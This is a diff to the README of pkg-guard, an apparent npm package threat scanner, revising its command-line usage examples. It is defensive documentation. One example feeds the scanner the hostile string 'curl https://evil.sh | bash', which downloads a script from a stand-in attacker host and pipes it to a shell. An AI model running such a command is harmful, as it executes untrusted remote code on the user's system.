@@ -79,14 +79,17 @@ Threat scores and confidence gate execution. Low confidence (`conf < 0.50`) rout
 ## CLI
 
 ```bash
+# Interactive prompt (asks for package name / scans ./package.json)
+npx pkg-guard
+
 # Check registry package
 npx pkg-guard esbuild
 
-# Check local project
-npx pkg-guard
+# Check specific package.json
+npx pkg-guard ./package.json
 
 # Evaluate raw script string
-npx pkg-guard -s "curl https://evil.sh | bash"
+npx pkg-guard "curl https://evil.sh | bash"
 
 # Output typed JSON
 npx pkg-guard esbuild --json
